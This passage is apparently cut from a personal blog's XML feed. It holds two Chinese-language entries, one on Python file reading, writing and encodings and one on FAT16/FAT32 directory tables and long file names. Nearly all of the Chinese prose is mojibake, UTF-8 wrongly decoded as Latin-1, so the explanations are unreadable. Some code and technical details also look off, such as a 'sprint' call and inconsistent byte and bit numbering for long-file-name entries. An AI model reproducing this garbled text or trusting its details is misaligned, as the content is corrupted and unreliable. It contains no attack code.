f.close()</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ¯æ¬¡éƒ½è¿™ä¹ˆå†™å®åœ¨å¤ªç¹çï¼Œæ‰€ä»¥ï¼ŒPythonå¼•å…¥äº†<code>with</code>è¯­å¥æ¥è‡ªåŠ¨å¸®æˆ‘ä»¬è°ƒç”¨ <code>close()</code>æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="built_in">print</span>(f.read())</span><br></pre></td></tr></table></figure><p>è¿™å’Œå‰é¢çš„ <code>try ... finally</code>æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ä»£ç æ›´ä½³ç®€æ´ï¼Œå¹¶ä¸”ä¸å¿…è°ƒç”¨ <code>f.close()</code>æ–¹æ³•ã€‚</p><p>è°ƒç”¨ <code>read()</code> ä¼šä¸€æ¬¡æ€§è¯»å–æ–‡ä»¶çš„å…¨éƒ¨å†…å®¹ï¼Œå¦‚æœæ–‡ä»¶æœ‰10Gï¼Œå†…å­˜å°±çˆ†äº†ï¼Œæ‰€ä»¥ï¼Œè¦ä¿é™©èµ·è§ï¼Œå¯ä»¥åå¤è°ƒç”¨ <code>read(size)</code>æ–¹æ³•ï¼Œæ¯æ¬¡æœ€å¤šè¯»å– size ä¸ªå­—èŠ‚çš„å†…å®¹ã€‚å¦å¤–ï¼Œè°ƒç”¨ <code>readline()</code>å¯ä»¥æ¯æ¬¡è¯»å–ä¸€è¡Œå†…å®¹ï¼Œè°ƒç”¨ <code>readlines()</code>ä¸€æ¬¡è¯»å–æ‰€æœ‰å†…å®¹å¹¶æŒ‰è¡Œè¿”å›<code>list</code>ã€‚å› æ­¤ï¼Œè¦æ ¹æ®éœ€è¦å†³å®šæ€ä¹ˆè°ƒç”¨ã€‚</p><p>å¦‚æœæ–‡ä»¶å¾ˆå°ï¼Œ<code>read()</code>ä¸€æ¬¡æ€§è¯»å–æœ€æ–¹ä¾¿ï¼›å¦‚æœä¸èƒ½ç¡®å®šæ–‡ä»¶å¤§å°ï¼Œåå¤è°ƒç”¨<code>read(size)</code>æ¯”è¾ƒä¿é™©ï¼›å¦‚æœæ˜¯é…ç½®æ–‡ä»¶ï¼Œè°ƒç”¨<code>readlines()</code>æœ€æ–¹ä¾¿ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    sprint(line.strip()) <span class="comment"># æŠŠæœ«å°¾çš„&#x27;\n&#x27;åˆ æ‰</span></span><br></pre></td></tr></table></figure><h3 id="å†™æ–‡ä»¶">å†™æ–‡ä»¶</h3><p>å†™æ–‡ä»¶å’Œè¯»æ–‡ä»¶æ˜¯ä¸€æ ·çš„ï¼Œå”¯ä¸€åŒºåˆ«æ˜¯è°ƒç”¨ <code>open()</code>å‡½æ•°æ—¶ï¼Œä¼ å…¥æ ‡è¯†ç¬¦ <code>w</code> æˆ–è€… <code>wb</code>è¡¨ç¤ºå†™æ–‡æœ¬æ–‡ä»¶æˆ–å†™äºŒè¿›åˆ¶æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.write(<span class="string">&#x27;Hello, world!&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f.close()</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥åå¤è°ƒç”¨<code>write()</code>æ¥å†™å…¥æ–‡ä»¶ï¼Œä½†æ˜¯åŠ¡å¿…è¦è°ƒç”¨<code>f.close()</code>æ¥å…³é—­æ–‡ä»¶ã€‚å½“æˆ‘ä»¬å†™æ–‡ä»¶æ—¶ï¼Œæ“ä½œç³»ç»Ÿå¾€å¾€ä¸ä¼šç«‹åˆ»æŠŠæ•°æ®å†™å…¥ç£ç›˜ï¼Œè€Œæ˜¯æ”¾åˆ°å†…å­˜ç¼“å­˜èµ·æ¥ï¼Œç©ºé—²çš„æ—¶å€™å†æ…¢æ…¢å†™å…¥ã€‚åªæœ‰è°ƒç”¨<code>close()</code>æ–¹æ³•æ—¶ï¼Œæ“ä½œç³»ç»Ÿæ‰ä¿è¯æŠŠæ²¡æœ‰å†™å…¥çš„æ•°æ®å…¨éƒ¨å†™å…¥ç£ç›˜ã€‚å¿˜è®°è°ƒç”¨<code>close()</code>çš„åæœæ˜¯æ•°æ®å¯èƒ½åªå†™äº†ä¸€éƒ¨åˆ†åˆ°ç£ç›˜ï¼Œå‰©ä¸‹çš„ä¸¢å¤±äº†ã€‚æ‰€ä»¥ï¼Œè¿˜æ˜¯ç”¨<code>with</code>è¯­å¥æ¥å¾—ä¿é™©ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;/Users/michael/test.txt&#x27;, &#x27;w&#x27;) as f:</span><br><span class="line">    f.write(&#x27;Hello, world!&#x27;)</span><br></pre></td></tr></table></figure><p>è¦å†™å…¥ç‰¹å®šç¼–ç çš„æ–‡æœ¬æ–‡ä»¶ï¼Œè¯·ç»™<code>open()</code>å‡½æ•°ä¼ å…¥<code>encoding</code>å‚æ•°ï¼Œå°†å­—ç¬¦ä¸²è‡ªåŠ¨è½¬æ¢æˆæŒ‡å®šç¼–ç </p><h3 id="å­—ç¬¦ç¼–ç ">å­—ç¬¦ç¼–ç </h3><p>è¦è¯»å–é UTF-8 ç¼–ç çš„æ–‡æœ¬æ–‡ä»¶ï¼Œéœ€è¦ç»™ <code>open()</code>å‡½æ•°ä¼ å…¥<code>encoding</code>å‚æ•°ï¼Œä¾‹å¦‚ï¼Œè¯»å– GBK ç¼–ç çš„æ–‡ä»¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/gbk.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>) &gt;&gt;&gt; f.read() <span class="string">&#x27;æµ‹è¯•&#x27;</span></span><br></pre></td></tr></table></figure><p>é‡åˆ°æœ‰äº›ç¼–ç ä¸è§„èŒƒçš„æ–‡ä»¶ï¼Œä½ å¯èƒ½ä¼šé‡åˆ°<code>UnicodeDecodeError</code>ï¼Œå› ä¸ºåœ¨æ–‡æœ¬æ–‡ä»¶ä¸­å¯èƒ½å¤¹æ‚äº†ä¸€äº›éæ³•ç¼–ç çš„å­—ç¬¦ã€‚é‡åˆ°è¿™ç§æƒ…å†µï¼Œ<code>open()</code>å‡½æ•°è¿˜æ¥æ”¶ä¸€ä¸ª<code>errors</code>å‚æ•°ï¼Œè¡¨ç¤ºå¦‚æœé‡åˆ°ç¼–ç é”™è¯¯åå¦‚ä½•å¤„ç†ã€‚æœ€ç®€å•çš„æ–¹å¼æ˜¯ç›´æ¥å¿½ç•¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/gbk.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br></pre></td></tr></table></figure><p>åœ¨ Windows ä¸‹æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå®¹æ˜“é‡åˆ°è¿™ç§é”™è¯¯ï¼šâ€œUnicodeEncodeError: 'gbk'codec can't encode character '' in position 46:illegal multibytesequenceâ€ï¼Œæ­¤æ—¶ï¼Œåªéœ€è¦è®¾ç½® open çš„å‚æ•°: encoding='utf-8' å³å¯ã€‚</p><h3 id="äºŒè¿›åˆ¶æ–‡ä»¶">äºŒè¿›åˆ¶æ–‡ä»¶</h3><p>å‰é¢è®²çš„é»˜è®¤éƒ½æ˜¯è¯»å–æ–‡æœ¬æ–‡ä»¶ï¼Œå¹¶ä¸”æ˜¯ UTF-8ç¼–ç çš„æ–‡æœ¬æ–‡ä»¶ã€‚è¦è¯»å–äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ¯”å¦‚å›¾ç‰‡ã€è§†é¢‘ç­‰ç­‰ï¼Œç”¨<code>'rb'</code>æ¨¡å¼æ‰“å¼€æ–‡ä»¶å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f = <span class="built_in">open</span>(<span class="string">&#x27;/Users/michael/test.jpg&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) &gt;&gt;&gt; f.read()</span><br><span class="line"><span class="string">b&#x27;\xff\xd8\xff\xe1\x00\x18Exif\x00\x00...&#x27;</span> <span class="comment"># åå…­è¿›åˆ¶è¡¨ç¤ºçš„å­—èŠ‚</span></span><br></pre></td></tr></table></figure><p>æ€»ç»“ï¼šä»¥åè¯»å†™æ–‡ä»¶éƒ½ä½¿ç”¨ with open è¯­å¥ï¼Œä¸è¦å†åƒä»¥å‰é‚£æ ·ç”¨ f =open()è¿™ç§è¯­å¥äº† with è¯­å¥çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p><p>with context expression [as target(s)]: with ä»£ç å—</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://www.cnblogs.com/cwp-bg/p/7835434.html">UnicodeEncodeError:'gbk' codec can't encode character '' in position 46:illegal multibytesequence</a></p><p><a href="https://www.cnblogs.com/ymjyqsx/p/6554817.html">pythonæ–‡ä»¶è¯»å†™,ä»¥åå°±ç”¨ with open è¯­å¥</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FDT æ–‡ä»¶ç›®å½•è¡¨</title>
      <link href="/blog/2020/04/25/os/3.fdt/"/>
      <url>/blog/2020/04/25/os/3.fdt/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>Format æ ¼å¼åŒ–æ—¶ï¼Œå·²å¯¹ç£ç›˜å»ºç«‹äº†ä¸€ä¸ªæ ¹ç›®å½• FDT(File DirectoryTable)ã€‚</p><ul><li>åœ¨æ ¹ç›®å½•ä¸‹ç”¨æˆ·å¯ä»¥åˆ›å»ºä¸åŒå­ç›®å½•æˆ–æ–‡ä»¶æ ¹ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŠå…¶å­ç›®å½•æœ‰ä¸€ä¸ªç›®å½•ç™»è®°é¡¹ã€‚The directory entry ofdirectory indicated the root directory address and its length is 0 byte.The directory entry of files indicates the data address.</li><li>æ ¹ç›®å½•ä»¥åŠå„ä¸ªå­ç›®å½•éƒ½æœ‰è‡ªå·±çš„ FDT(æ–‡ä»¶ç›®å½•è¡¨)ã€‚</li><li>DOS ä¸­ç”¨â€œ[ç›˜ç¬¦ï¼š]Â â€è¡¨ç¤ºæ ¹ç›®å½•</li><li>æ³¨æ„: æˆ‘ä»¬è®¨è®ºçš„é»˜è®¤æ˜¯ x86ï¼Œ é‡‡ç”¨å°ç«¯æ¨¡å¼ï¼Œé«˜å­—èŠ‚é«˜åœ°å€å­˜å‚¨ã€‚</li></ul><p>ç”±äº FAT16 ä¸ FAT32 æœ‰äº›åŒºåˆ«ï¼Œæ‰€ä»¥ä¸‹é¢æˆ‘ä»¬åˆ†å¼€è®²è¿°ã€‚</p><h2 id="fat16s-fdt">FAT16's FDT</h2><p>åœ¨ FAT16 åˆ†åŒºæ ¼å¼ä¸­ï¼ŒFDT è¡¨çš„é•¿åº¦æ˜¯å›ºå®šçš„ï¼Œä¸º 32 ä¸ªæ‰‡åŒº</p><ul><li>æ¯ä¸ªç›®å½•ç™»è®°é¡¹ 32 ä¸ªå­—èŠ‚ï¼Œåˆ† 8 ä¸ªåŒºåŸŸï¼Œæä¾›æ–‡ä»¶ç›®å½•ä¿¡æ¯ã€‚</li><li>æœ€å¤šä¿å­˜ 512 ä¸ªæ–‡ä»¶æˆ–å­ç›®å½•ã€‚</li><li><code>æ‰‡åŒºä¸ªæ•°ï¼ˆ32ï¼‰*æ¯ä¸ªæ‰‡åŒºå¤§å°ï¼ˆ512ï¼‰=æ¯ä¸ªç›®å½•é¡¹å¤§å°ï¼ˆ32 å­—èŠ‚ï¼‰*ç›®å½•é¡¹æœ€å¤§ä¸ªæ•°ï¼ˆ512ï¼‰</code></li></ul><h3 id="layout">Layout</h3><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587783489268.png"alt="FAT16&#39;s FDT" /><figcaption aria-hidden="true">FAT16's FDT</figcaption></figure><p>ä¸‹é¢ä»‹ç»ä¸€äº›æ­¤æ ¼å¼ä¸­é‡è¦çš„éƒ¨åˆ†:</p><ol type="1"><li><p>æ–‡ä»¶çŠ¶æ€: 0 å­—èŠ‚åç§» ç¬¬ä¸€å­—èŠ‚(0 å·å­—èŠ‚)ï¼Œè¡¨ç¤ºå½“å‰æ–‡ä»¶çš„çŠ¶æ€ã€‚ |å€¼ | å«ä¹‰ | | ------- | ---------------------- | | 00H |ç›®å½•é¡¹ç©ºè¡¨é¡¹ï¼ˆæœªä½¿ç”¨ï¼‰ | | E5H | æ›¾ä½¿ç”¨è¿‡ï¼Œä½†å·²åˆ é™¤ | | 2EH | "."å½“å‰ç›®å½• | | 2EH 2EH | ".." ä¸Šä¸€çº§ç›®å½• |</p></li><li><p>å±æ€§å­—èŠ‚: 11 å­—èŠ‚åç§»</p><ol type="1"><li><p>å±æ€§å­—èŠ‚ä¸­æ˜¯æ¯”ç‰¹ä½å¯¹åº”å±æ€§ å¤šç§æ¯”ç‰¹ä½çš„å€¼è¡¨ç¤ºå…¶æœ‰å¤šç§å±æ€§ï¼Œä¾‹å¦‚:ç³»ç»Ÿéšå«å¸¸å¸¸å’Œæ–‡ä»¶æˆ–ç›®å½•ä¸€èµ·å­˜åœ¨ã€‚ ç¤ºä¾‹:</p><ol type="1"><li>ç³»ç»Ÿéšå«æ–‡ä»¶: 0010 0110H = 26</li><li>ç³»ç»Ÿéšå«å­ç›®å½•: 0001 0110H = 16 å¸¸è§å±æ€§å­—èŠ‚ä¸å€¼: | å€¼ | ç±»å‹ | |--- | -------------- | | 20 | æ¡£æ¡ˆ(æ–‡ä»¶) | | 10 | å­ç›®å½• | | 08 | å·æ ‡ || 16 | ç³»ç»Ÿéšå«å­ç›®å½• | | 26 | ç³»ç»Ÿéšå«æ–‡ä»¶ |</li></ol></li><li><p>å·æ ‡</p><ul><li>æ˜¯ä¸€ä¸ªç£ç›˜çš„ä¸€ä¸ªæ ‡è¯†ï¼Œä¸å”¯ä¸€ã€‚ç”±æ ¼å¼åŒ–è‡ªåŠ¨ç”Ÿæˆæˆ–äººä¸ºè®¾å®šã€‚ä»…ä»…æ˜¯ä¸€ä¸ªåŒºåˆ«äºå…¶ä»–ç£ç›˜çš„æ ‡è¯†è€Œå·²ã€‚</li><li>å·æ ‡ä¹Ÿå ç”¨ä¸€ä¸ªç›®å½•ç™»è®°é¡¹</li><li>å¯ä»¥çœ‹å‡ºå·æ ‡ï¼Œå­ç›®å½•å’Œæ–‡ä»¶ç”¨çš„æ˜¯ä¸åŒæ¯”ç‰¹ä½ï¼Œæ‰€ä»¥è®¡ç®—æ–‡ä»¶ä¸ªæ•°çš„æ—¶å€™ä¸è¦ç®—å·æ ‡ï¼Œå­ç›®å½•å“¦</li></ul></li><li><p>å­ç›®å½•</p><ul><li>DOSé‡‡ç”¨å±‚æ¬¡ç›®å½•ï¼Œæ ‘å‹ç›®å½•ç»“æ„ã€‚å­ç›®å½•å’Œæ–‡ä»¶ä¸€æ ·éƒ½æœ‰ç›®å½•ç™»è®°é¡¹ï¼Œå­ç›®å½•çš„ç›®å½•åå’Œæ–‡ä»¶åè¡¨ç¤ºæ–¹å¼åŸºæœ¬ä¸€æ ·ï¼Œç›®å½•ç™»è®°é¡¹ä¸­ï¼šæ—¥æœŸã€æ—¶é—´ã€èµ·å§‹ç°‡è¡¨ç¤ºæ–¹å¼ä¸€æ ·,åªæœ‰å±æ€§å’Œé•¿åº¦è¡¨ç¤ºä¸åŒï¼Œé•¿åº¦å›ºå®šä¸º 0ã€‚</li><li>æ ¹ç›®å½•ç”± DBRç¡®å®šï¼Œè€Œå­ç›®å½•ç”±æ ¹ç›®å½•ä¸‹çš„ç›®å½•ç™»è®°é¡¹ç¡®å®šï¼Œå¦‚æœæˆ‘ä»¬è¦åˆ†æå­ç›®å½•ä¸‹çš„ä¸œè¥¿ï¼Œéœ€è¦å»å­ç›®å½•çš„FDT å»çœ‹ã€‚</li><li>ç³»ç»Ÿé€šè¿‡ <code>.</code> å’Œ <code>..</code>å®ç°ç›®å½•é—´çš„åŒå‘è”ç³»ï¼Œä½¿ç›®å½•èƒ½åœ¨ç›®å½•ä¹‹é—´è¿›è¡Œåˆ‡æ¢</li><li>å­ç›®å½•æ¯”æ ¹ç›®å½•å¤šä¸¤ä¸ªç›®å½•é¡¹ï¼Œå³ <code>.</code> å’Œ <code>..</code>,<code>.</code> è¡¨ç¤ºå½“å‰å­ç›®å½•ï¼Œ <code>..</code> è¡¨ç¤ºå½“å‰å­ç›®å½•çš„çˆ¶ç›®å½•<imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587785628621.png"alt="sub-directory" /></li></ul></li><li><p>æ–‡ä»¶é¦–ç°‡å·</p></li><li><p>æ–‡ä»¶é•¿åº¦</p></li></ol></li></ol><h3 id="å‰©ä½™æ‰‡åŒºæ•°è®¡ç®—">å‰©ä½™æ‰‡åŒºæ•°è®¡ç®—</h3><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587797970353.png"alt="FAT16" /><figcaption aria-hidden="true">FAT16</figcaption></figure><p>ç³»ç»Ÿåœ¨åˆ†åŒºæ—¶ä¼šä»¥æŸ±é¢ä¸ºåˆ†éš”é¢ï¼Œå°†åŒä¸€æŸ±é¢çš„æ‰‡åŒºåˆ’åˆ†åœ¨ä¸€ä¸ªåˆ†åŒºå†…ã€‚åˆ’åˆ†5 ä¸ªåŒºåŸŸçš„è¿‡ç¨‹ï¼Œå®¹æ˜“å‡ºç° <strong>DATAæ‰‡åŒºä¸æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå³æœ‰å°‘äºä¸€ä¸ªç°‡çš„æ‰‡åŒº</strong></p><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587798404564.png"alt="FAT16 DBR" /> æ ¹æ® DBR çŸ¥é“ï¼Œæ¯ç°‡ 32 ä¸ªæ‰‡åŒºï¼Œ ä¿ç•™æ‰‡åŒº 4ä¸ªï¼Œæ‰‡åŒºæ€»æ•° 1060227ï¼Œæ­¤å¤–ï¼ŒFDT å¤§å°ä¸º 32 ä¸ªæ‰‡åŒºã€‚</p><p>DATA åŒºçš„æ‰‡åŒºæ•°ï¼ˆåŒ…å«å‰©ä½™æ‰‡åŒºï¼‰ = 1060227â€“4â€“130x2â€“32 = 1059931</p><p>DATA åŒºçš„ç°‡æ•°ï¼ˆåŒ…å«å‰©ä½™æ‰‡åŒºï¼‰ = 1059931 / 32 = 33122.84375 çº¦ç­‰äº33122</p><p>é‚£ä¹ˆï¼Œå‰©ä½™æ‰‡åŒºæ•° = 1059931-33122Ã—32 = 0.84375 x 32 = 27å³å‰©ä½™æ‰‡åŒºæ•°ä¸º 27</p><h2 id="fat32s-directory">FAT32's Directory</h2><p>FAT32 ä¸­ç›®å½•ä¸å†å•ç‹¬å æœ‰ä¸€å—åŒºåŸŸï¼Œå¯è®¤ä¸ºæ˜¯æ•°æ®åŒºçš„ä¸€éƒ¨åˆ†ï¼Œå…¶å¤§å°å¯å˜ï¼Œä¸å†åƒ FAT16ä¸€æ ·å›ºå®šæ‰‡åŒºäº†ã€‚æ­¤å¤–ï¼Œæ ¹ç›®å½•æ”¹æˆäº†æ ¹ç›®å½•æ–‡ä»¶ã€‚</p><ul><li>æ ¹ç›®å½•æ–‡ä»¶æ•°æ®ä¸å— 512 ä¸ªé™åˆ¶</li><li>æ ¹ç›®å½•åˆå§‹å®šä¸º 1 ä¸ªç°‡çš„å¤§å°ï¼Œè‹¥ç©ºé—´ä¸å¤Ÿï¼ŒFAT ä¸ºæ ¹ç›®å½•è¿½åŠ æ–°çš„ç°‡</li><li>åŸåˆ™ä¸Š FAT32 å…è®¸æ ¹ç›®å½•ä½äºæ•°æ®åŒºä¸­çš„ä»»ä½•ä½ç½®ï¼Œé€šå¸¸ä½äº 2å·ç°‡ã€‚</li><li>æ‰€æœ‰ç°‡ä» 2 å·å¼€å§‹ä¾æ¬¡ç¼–å·ã€‚2å·ç°‡ä¸æ˜¯ä½äºæ–‡ä»¶ç³»ç»Ÿå¼€å§‹å¤„ï¼Œè€Œæ˜¯ä½äºæ•°æ®åŒºï¼Œå¯»æ‰¾ 2å·ç°‡æ–¹æ³•æ¯”è¾ƒç¹çã€‚</li><li>æ•°æ®åŒºä»¥å‰çš„åŒºåŸŸä¸èƒ½ä½¿ç”¨ FAT è¡¨ç®¡ç†ï¼Œå› æ­¤åªèƒ½ä½¿ç”¨æ‰‡åŒºåœ°å€</li><li>FAT32 ç›®å½•åŒºçš„æ–‡ä»¶ç›®å½•é¡¹åŒ…æ‹¬:<ol type="1"><li>æ–‡ä»¶ç›®å½•é¡¹</li><li>å­ç›®å½•é¡¹</li><li>å·æ ‡é¡¹ï¼ˆä»…æ ¹ç›®å½•æœ‰ï¼‰</li><li>å·²åˆ é™¤ç›®å½•é¡¹</li></ol></li></ul><p>FAT32 çš„ç›®å½•ç™»è®°é¡¹é€šè¿‡åˆ©ç”¨ FAT16çš„ç›®å½•ç™»è®°é¡¹ä¸­çš„ä¿ç•™æœªç”¨éƒ¨åˆ†ï¼Œå®ç°äº†æ‰©å®¹ã€‚å…·ä½“è§ä¸‹å›¾:</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587788386866.png"alt="FAT32 directory entry" /><figcaption aria-hidden="true">FAT32 directory entry</figcaption></figure><p>å›¾ä¸­æˆ‘ç”¨ç»¿è‰²æ·±çº¿æ¡†é€‰çš„ä¾¿æ˜¯åŸæ¥åœ¨ FAT16 ä¸­çš„ä¿ç•™æœªç”¨éƒ¨åˆ†ã€‚ æ³¨æ„: FAT32çš„ç›®å½•ç™»è®°é¡¹ä¸­ç°‡å·ç”±ä¸¤éƒ¨åˆ†ç»„æˆ: èµ·å§‹ç°‡å·çš„é«˜ 16 ä½å’Œèµ·å§‹ç°‡å·çš„ä½ 16ä½</p><h3 id="é•¿æ–‡ä»¶å">é•¿æ–‡ä»¶å</h3><p>FAT32 æ”¯æŒé•¿æ–‡ä»¶åã€‚</p><p>é•¿æ–‡ä»¶åçš„å®ç°:</p><ul><li>é™¤ä¸€äº›ç£ç›˜å·¥å…·å¤–ï¼Œå¤šæ•°ç¨‹åºé€šè¿‡æ“ä½œç³»ç»Ÿè·å–æ–‡ä»¶åå’Œç›®å½•å</li><li>è‹¥è®¾ç½®æ–‡ä»¶å±æ€§ä¸º 0FHï¼ŒDOS å’Œ Windows 3.x ä¼šå¿½ç•¥è¯¥ç›®å½•é¡¹</li><li>è§£å†³é•¿æ–‡ä»¶åä¸ DOSï¼ŒWin 3.x å…¼å®¹æ€§é—®é¢˜</li></ul><p>Windows95ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶æˆ–ç›®å½•è®¾è®¡å­˜å‚¨ä¸¤ä¸ªåå­—ï¼Œå³çŸ­æ–‡ä»¶åå’Œé•¿æ–‡ä»¶åã€‚å…¶ä¸­é•¿æ–‡ä»¶åå¯¹åº”çš„çŸ­æ–‡ä»¶åå¤„ç†åŸåˆ™:</p><ol type="1"><li>å–é•¿æ–‡ä»¶åå‰ 6 ä¸ªå­—ç¬¦åŠ â€œ~1â€ï¼Œæ‰©å±•åä¸é™</li><li>è‹¥å·²å­˜åœ¨è¯¥åå­—ï¼Œåˆ™â€œ~â€åçš„æ•°å­—è‡ªåŠ¨å¢åŠ </li><li>è‹¥æœ‰ DOSï¼ŒWin 3.x éæ³•å­—ç¬¦ï¼Œç”¨ â€œ_â€ æ›¿ä»£</li></ol><p>è¿™å°±æ„å‘³ç€å¦‚æœä¸€ä¸ªæ–‡ä»¶æˆ–è€…ç›®å½•çš„åå­—è¿‡é•¿ï¼Œä»–ä»¬çš„ç›®å½•ç™»è®°é¡¹å°±è‡³å°‘æœ‰4*16 = 64 å­—èŠ‚çš„é•¿åº¦ï¼Œå…¶ä¸­ï¼ŒçŸ­æ–‡ä»¶åéƒ¨åˆ†æ ¼å¼ä¸ä¹‹å‰ä»‹ç»çš„ä¸€è‡´ã€‚</p><p>é•¿æ–‡ä»¶åéƒ¨åˆ†,æˆ‘ä»¬éœ€è¦å…³æ³¨çš„æœ‰ä»¥ä¸‹å‡ éƒ¨åˆ†: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587789961614.png"alt="long file name part" /></p><ol start="0" type="1"><li>é•¿æ–‡ä»¶åéƒ¨åˆ†ä¹Ÿæ˜¯ä»¥ 32 ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå†…éƒ¨å°å•ä½ï¼Œè¿›è¡Œæ ‡è¯†ã€‚</li><li>0 å·å­—èŠ‚ï¼ˆç¬¬ä¸€ä¸ªå­—èŠ‚ï¼‰ 1 å·æ¯”ç‰¹(ä» 0 å¼€å§‹)ä¸º 1è¡¨ç¤ºè¿™æ˜¯é•¿æ–‡ä»¶çš„æœ€åä¸€ä¸ªç™»è®°é¡¹ï¼ˆä¹Ÿå°±æ˜¯è¿™ä¸ªé•¿æ–‡ä»¶åç›®å½•ç™»è®°é¡¹åˆ°æ­¤ç»“æŸï¼‰3-7 å·æ¯”ç‰¹ï¼Œè¡¨ç¤ºè¿™æ˜¯é•¿æ–‡ä»¶åç›®å½•éƒ¨åˆ†çš„ç¬¬å‡ éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯é¡ºåºå·ã€‚</li><li>11 å·å­—èŠ‚ï¼ˆç¬¬ 12 ä¸ªå­—èŠ‚ï¼‰ å±æ€§å­—èŠ‚ä¸º "0F" è¡¨ç¤ºè¯¥é¡¹ä¸ºé•¿æ–‡ä»¶å</li><li>31 å·å­—èŠ‚(ç¬¬ 14 ä¸ªå­—èŠ‚)åŒä¸€æ–‡ä»¶æ ‡å·ï¼Œè¯¥å­—èŠ‚ç›¸åŒè¡¨ç¤ºè¿™æ˜¯åŒä¸€ä¸ªæ–‡ä»¶çš„é•¿æ–‡ä»¶åéƒ¨åˆ†ã€‚</li></ol><p>ä¸‹é¢æˆ‘ä»¬è¯¦ç»†åœ°åˆ†æä¸€ä¸ªé•¿æ–‡ä»¶å: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204251587790842536.png"alt="a long file name directory entry" /></p><p>é‡è¦éƒ¨åˆ†å·²æ ‡è¯†ï¼Œä¸‹é¢ä¸€ä¸€åˆ†æã€‚</p><ol type="1"><li><p>æœ€å·¦ä¾§ä¸€åˆ—ã€‚</p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç»“æŸå¤„ä¸º: 43H = 0100 0011B, å³: 1 å·æ¯”ç‰¹çš„ "1"æ ‡è¯†é•¿æ–‡ä»¶åç»“æŸï¼Œåé¢äº”ä¸ªå­—èŠ‚ä¸ºé•¿æ–‡ä»¶åç›®å½•ç™»è®°é¡¹çš„é•¿æ–‡ä»¶åéƒ¨åˆ†çš„é¡ºåºå·ï¼Œä»1 å¼€å§‹ã€‚æˆ‘ä»¬ä»ä¸‹å‘ä¸Šçœ‹ï¼Œå¯ä»¥çœ‹åˆ° 1 2 3 è¯´æ˜é•¿æ–‡ä»¶åéƒ¨åˆ†æœ‰ 3ä¸ªï¼Œä¹Ÿå°±æ˜¯è¯¥é•¿æ–‡ä»¶åç›®å½•ç™»è®°é¡¹å¤§å°<code>3*32 + 32 = 128 å­—èŠ‚</code></p></li><li><p>â€œ0Fâ€ ä½œä¸ºé•¿æ–‡ä»¶åéƒ¨åˆ†çš„æ ‡è¯†ç¬¦ã€‚</p></li><li><p>â€œ08â€ åŒä¸€ä¸ªæ–‡ä»¶çš„æ ‡è¯†ç¬¦</p><p>ä¹Ÿå°±æ˜¯è¯´ 